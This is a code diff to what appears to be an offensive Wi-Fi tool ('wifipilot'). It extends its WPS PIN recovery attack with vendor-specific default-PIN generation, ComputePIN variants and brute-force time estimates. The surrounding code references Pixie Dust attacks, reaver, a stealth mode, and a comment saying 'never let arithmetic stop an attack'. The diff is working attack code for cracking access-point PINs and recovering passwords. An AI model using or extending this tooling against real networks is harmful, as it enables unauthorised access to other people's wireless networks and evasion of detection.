@@ -81,11 +81,31 @@ KNOWN_STATIC_PINS = (
 
 
 def candidate_pins(ap: AccessPoint) -> List[Tuple[str, str]]:
+    """Candidate PINs for this AP, best first.
+
+    Delegates the arithmetic to :mod:`wifipilot.wps`, which knows which vendors
+    ship which defaults, the published ComputePIN variants, and that AVM leaves
+    the PIN off — so the candidates come with provenance (``source``) rather than
+    being an opaque list of eight-digit numbers.  The legacy
+    :data:`DEFAULT_PIN_ALGORITHMS` list stays as the fallback.
+    """
+    from .. import wps as wps_module
+    from ..util import oui_vendor
+
+    vendor = ap.vendor or oui_vendor(ap.bssid)
     out: List[Tuple[str, str]] = []
-    for name, function in DEFAULT_PIN_ALGORITHMS.items():
-        with contextlib.suppress(Exception):
-            out.append((function(ap.bssid), f"{name} default algorithm"))
-    out.extend((pin, "common default PIN") for pin in KNOWN_STATIC_PINS[:3])
+    try:
+        for item in wps_module.candidate_pins(bssid=ap.bssid, essid=ap.essid,
+                                              vendor=vendor):
+            if item.pin:
+                out.append((item.pin, item.source))
+    except Exception:                     # never let arithmetic stop an attack
+        out = []
+    if not out:
+        for name, function in DEFAULT_PIN_ALGORITHMS.items():
+            with contextlib.suppress(Exception):
+                out.append((function(ap.bssid), f"{name} default algorithm"))
+        out.extend((pin, "common default PIN") for pin in KNOWN_STATIC_PINS[:3])
     seen, unique = set(), []
     for pin, source in out:
         if pin and pin not in seen:
@@ -293,6 +313,28 @@ class PixieDustAttack(WpsAttack):
         return AttackOutcome.success(detail, capture, tool)
 
 
+def _plan(ap: AccessPoint) -> Dict[str, object]:
+    """The attempt plan for this AP (see :func:`wifipilot.wps.attempt_plan`)."""
+    from .. import wps as wps_module
+    from ..util import oui_vendor
+    try:
+        return wps_module.attempt_plan(bssid=ap.bssid, essid=ap.essid,
+                                       vendor=ap.vendor or oui_vendor(ap.bssid))
+    except Exception:
+        return {}
+
+
+def _plan_text(plan: Dict[str, object]) -> str:
+    """One line the operator can act on: what the sweep would actually cost."""
+    spaces = plan.get("spaces") or {}
+    if not spaces:
+        return "online brute force not enabled"
+    seconds = (plan.get("seconds") or {}).get("two-half sweep", 0)
+    return (f"a full sweep is {spaces.get('checksum-valid PINs', 0):,} PINs "
+            f"(~{human_duration(float(seconds))} at 2s each); the two-half attack is "
+            f"{spaces.get('two-half sweep (the documented attack)', 0):,}")
+
+
 class WpsPinAttack(WpsAttack):
     name = "wps_pin"
     label = "WPS PIN recovery (online)"
@@ -330,8 +372,9 @@ class WpsPinAttack(WpsAttack):
                 password = ctx.radio.crack(ap.bssid, kind="wps").get("password", "")
                 return PixieDustAttack._finish(self, ctx, ap, attempt, pin, password,
                                                "reaver -p (simulated)")
+        plan = _plan(ap)
         return self._fail(ctx, attempt, "no default PIN matched",
-                          f"{len(pins)} candidates tried; online brute force not enabled")
+                          f"{len(pins)} candidate(s) tried; {_plan_text(plan)}")
 
     def _run_live(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt) -> AttackOutcome:
         timeout = ctx.config.attack_timeout_for(self.name)
@@ -355,6 +398,7 @@ class WpsPinAttack(WpsAttack):
             if outcome.extra.get("locked"):
                 return outcome
         # 2) genuine brute force, rate limited to be as gentle as possible
+        ctx.bus.log(_plan_text(_plan(ap)), level="info")
         if ctx.config.stealth:
             return self._fail(ctx, attempt, "brute force skipped in stealth mode",
                               "online PIN brute force is disabled while stealth is on")
